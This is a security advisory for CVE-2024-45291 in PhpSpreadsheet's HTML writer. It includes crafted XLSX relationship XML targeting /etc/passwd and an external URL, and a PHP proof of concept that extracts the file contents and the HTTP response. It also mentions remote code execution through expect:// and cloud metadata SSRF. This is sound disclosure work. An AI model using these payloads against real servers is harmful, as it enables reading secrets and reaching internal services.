# [M] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled

## Summary
Severity: Medium
Advisory: GHSA-w9xv-qf98-ccq4
CVE: CVE-2024-45291
CWE: CWE-22, CWE-36, CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2024-10-07
Source: https://github.com/advisories/GHSA-w9xv-qf98-ccq4
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.3.0
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.29.2
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.1
- Packagist: `phpoffice/phpexcel` — affected >=0

## Details
### Summary

It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with `$writer->setEmbedImages(true);` those files will be included in the output as `data:` URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.

### Details

XLSX files allow embedding or linking media. When 

In `xl/drawings/drawing1.xml` an attacker can do e.g.:
```xml
<a:blip cstate="print" r:link="rId1" />
```

And then, in `xl/drawings/_rels/drawing1.xml.rels` they can set the path to anything, such as:
```xml
<Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="/etc/passwd" />
```
or
```xml
<Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="http://example.org" />
```

When the HTML writer is outputting the image, it does not check the path in any way. Also the `getimagesize()` call does not mitigate this, because when `getimagesize()` returns false, an empty mime type is used.

```php
if ($this->embedImages || str_starts_with($imageData, 'zip://')) {
    $picture = @file_get_contents($filename);
    if ($picture !== false) {
        $imageDetails = getimagesize($filename) ?: ['mime' => ''];
        // base64 encode the binary data
        $base64 = base64_encode($picture);
        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;
    }
}

$html .= '<img style="position: absolute; z-index: 1; left: '
    . $drawing->getOffsetX() . 'px; top: ' . $drawing->getOffsetY() . 'px; width: '
    . $drawing->getWidth() . 'px; height: ' . $drawing->getHeight() . 'px;" src="'
    . $imageData . '" alt="' . $filedesc . '" />';
```

### PoC

```php
<?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader->load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
$writer->setEmbedImages(true);
$output = $writer->generateHTMLAll();

// The below is just for demo purposes

$pattern = '/data:;base64,(?<data>[^"]+)/i';

preg_match_all($pattern, $output, $matches);

print("*** /etc/passwd content: ***\n");
print(base64_decode($matches['data'][0]));

print("*** HTTP response content: ***\n");
print(base64_decode($matches['data'][1]));
```

Add this file in the same directory:
[book.xlsx](https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx)

Run with:
`php index.php`

### Impact

When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. [revealing secrets](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/). Note that any PHP protocol wrappers can be used, meaning that if for example the `expect://` wrapper is enabled, also remote code execution is possible.

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4
- https://nvd.nist.gov/vuln/detail/CVE-2024-45291
- https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a
- https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec
- https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465
- https://github.com/PHPOffice/PhpSpreadsheet
